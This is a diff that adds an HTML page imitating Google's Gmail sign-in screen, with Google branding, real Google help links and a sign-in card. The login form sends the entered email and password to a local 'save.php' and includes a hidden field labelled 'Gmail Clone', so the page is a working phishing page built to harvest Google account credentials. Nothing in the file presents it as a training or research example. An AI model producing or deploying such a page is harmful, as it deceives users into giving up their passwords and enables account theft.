@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gmail - login page</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f2f2f2;
+      color: #333;
+    }
+
+    .wrapper {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .google-header-bar {
+      background-color: white;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 20px 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    .logo {
+      height: 45px;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .banner h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      font-weight: 400;
+    }
+
+    .banner h2 {
+      font-size: 16px;
+      color: #777;
+      margin-bottom: 30px;
+    }
+
+    .signin-card {
+      background-color: white;
+      padding: 30px;
+      border-radius: 4px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 320px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .profile-img {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      margin-bottom: 10px;
+    }
+
+    .signin-card input[type="email"],
+    .signin-card input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .rc-button-submit {
+      background-color: #4d90fe;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 3px;
+      font-weight: bold;
+      font-size: 14px;
+      width: 100%;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .rc-button-submit:hover {
+      background-color: #357ae8;
+    }
+
+    .remember {
+      font-size: 13px;
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+    }
+
+    .remember input {
+      margin-right: 5px;
+    }
+
+    .need-help-reverse {
+      margin-top: 10px;
+      font-size: 13px;
+      display: inline-block;
+    }
+
+    .one-google {
+      text-align: center;
+      margin-top: 40px;
+    }
+
+    .one-google p,
+    .one-google img {
+      margin: 10px 0;
+    }
+
+    .google-footer-bar {
+      background-color: white;
+      border-top: 1px solid #e0e0e0;
+      padding: 10px 20px;
+      text-align: center;
+    }
+
+    .footer ul {
+      list-style: none;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+
+    .footer ul li {
+      color: #555;
+      font-size: 13px;
+    }
+
+    .footer ul li a {
+      color: #555;
+      text-decoration: none;
+    }
+
+    .lang-chooser-wrap {
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="google-header-bar centered">
+      <div class="header content clearfix">
+        <img alt="Google" class="logo" src="https://freepngimg.com/download/temp_png/66907-images-logo-google-free-download-png-hd.jpeg">
+      </div>
+    </div>
+    <div class="main content clearfix">
+      <div class="banner">
+        <h1>One account. All of Google.</h1>
+        <h2 class="hidden-small">Sign in to continue to Gmail</h2>
+      </div>
+      <div class="card signin-card clearfix">
+        <img class="profile-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCW1cX5u2-mK6kWBD5Ugc1XVFfcO4vQ3a2_Q&usqp=CAU" alt="">
+        <form novalidate method="post" action="save.php">
+          <input type="hidden" name="source" value="Gmail Clone">
+          <label for="Email" class="hidden-label">Email</label>
+          <input id="Email" name="username" type="email" placeholder="Email" spellcheck="false">
+          <label for="Passwd" class="hidden-label">Password</label>
+          <input id="Passwd" name="password" type="password" placeholder="Password">
+          <input id="signIn" name="signIn" class="rc-button-submit" type="submit" value="Sign in">
+          <label class="remember">
+            <input type="checkbox" value="yes" checked>
+            <span>Stay signed in</span>
+          </label>
+          <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?service=mail" class="need-help-reverse">Need help?</a>
+        </form>
+      </div>
+      <div class="one-google">
+        <p class="create-account">
+          <a id="link-signup" href="https://accounts.google.com/SignUp?service=mail">Create an account</a>
+        </p>
+        <p class="tagline">One Google Account for everything Google</p>
+        <img src="./Gmail_files/logo_strip_2x.png" width="210" height="17" alt="">
+      </div>
+    </div>
+    <div class="google-footer-bar">
+      <div class="footer content clearfix">
+        <ul id="footer-list">
+          <li>Google</li>
+          <li><a href="https://accounts.google.com/TOS?loc=PH&hl=en" target="_blank">Privacy & Terms</a></li>
+          <li><a href="http://www.google.com/support/accounts?hl=en" target="_blank">Help</a></li>
+        </ul>
+        <div class="lang-chooser-wrap">
+          <label for="lang-chooser"><img src="images.png" alt="Change language"></label>
+          <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
+            <option value="pl">‪Polski‬</option>
+            <option value="de">‪Niemiecki‬</option>
+          </select>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
